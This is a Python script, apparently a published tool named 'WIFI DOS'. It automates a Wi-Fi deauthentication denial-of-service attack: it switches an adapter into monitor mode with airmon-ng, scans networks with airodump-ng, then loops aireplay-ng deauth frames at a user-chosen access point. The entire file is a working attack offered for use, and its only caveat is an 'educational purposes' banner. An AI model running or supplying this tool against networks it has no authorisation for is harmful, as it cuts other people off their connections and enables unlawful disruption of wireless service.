import subprocess
import re
import os
import time
from datetime import datetime
from time import sleep
from rich.console import Console
import sys

def slowprint(text):
	for letter in text:
		sys.stdout.write(letter)
		sys.stdout.flush()
		sleep(.003)

console = Console()

subprocess.call("clear", shell=True)

slowprint(r"""
  ______   ______   ______   ______   _    _
 | _____| |      | | _____| | _____| | |  | |
 | |__    |  []  | | |__    | |___   | |__| |
 |  _|    |  ____| |  _|     _____ | | ____ |
 | |      | |\ \   | |____  |______| | |  | |
 | |      | | \ \  |      | Loading  | |  | |
<---------------------------------------------->""")
print("\n<|Copyright | FRESH | 2022                    |>")
print("<|Tool: WIFI DOS                              |>")
print("<|Please report any bugs | on github          |>")
print("<|github: github.com/FreshCoffe/wifi_dos      |>")
print("<|Only for educational purposes               |>")
print("<---------------------------------------------->")
if not 'SUDO_UID' in os.environ.keys():
	print("Run this program with sudo")
	exit()
	

def adapter_check():
	global interface
	wlan_adap_check = re.compile("^wlo[0-9]+")
	check_wifi_result = wlan_adap_check.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
	
	if len(check_wifi_result) == 0:
		try:
			 wlan_adap_check = re.compile("^wlan[0-9]+")
			 check_wifi_result = wlan_adap_check.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
		except:
			pass
	if len(check_wifi_result) == 0:
		print("Please connect a wifi adapter and try again!")
		exit()
	print("\n")
	with console.status("[bold green]Searching for interface..."):
		sleep(1)
		print("The following WiFi interfaces are available:")
	for index, item in enumerate(check_wifi_result):
    		print(f"{index} - {item}")
		
	while True:
    		wifi_interface_choice = input("Please select the wifi interface you want to use for the attack: ")
    		try:
        		if check_wifi_result[int(wifi_interface_choice)]:
            			break
    		except:
        		print("Please enter a number which is available!")

	interface = check_wifi_result[int(wifi_interface_choice)]
	return interface


def monitor_mode():
	with console.status("[bold green]Killing tasks..."):
		sleep(1)
	subprocess.run(["airmon-ng", "check", "kill"])
	with console.status("[bold green]Starting interface..."):
		sleep(1)
		print("Succesfully started interface")
	subprocess.run(["airmon-ng", "start", interface])


def scan():
	with console.status("[bold green]Clear shell..."):
		sleep(1)
	subprocess.call("clear", shell=True)
	try:
		print("Press Ctrl+c to stop scanning")
		sleep(2)
		subprocess.run(["airodump-ng", interface])
	except KeyboardInterrupt:
		print("Ready to Hack?")
		sleep(1) 


def attack():
	bssid = input("Please copy andy paste the bssid you wish to hack!\n BSSID: ")
	ch = input("Enter the channel of the bssid: ")
	print("Press Ctrl+c after 3 seconds")
	sleep(2)
	try:
		subprocess.run(["airodump-ng", "-c", ch, interface])
	except KeyboardInterrupt:
		subprocess.call("clear", shell=True)
	with console.status("[bold green]Starting attack..."):
		sleep(2)
	try:
		while True:
			subprocess.run(["aireplay-ng", "--deauth", "1", "-a", bssid, interface])
			sleep(0.3)
	except KeyboardInterrupt:
		subprocess.call("clear", shell=True)




adapter_check()
monitor_mode()
scan()
attack()
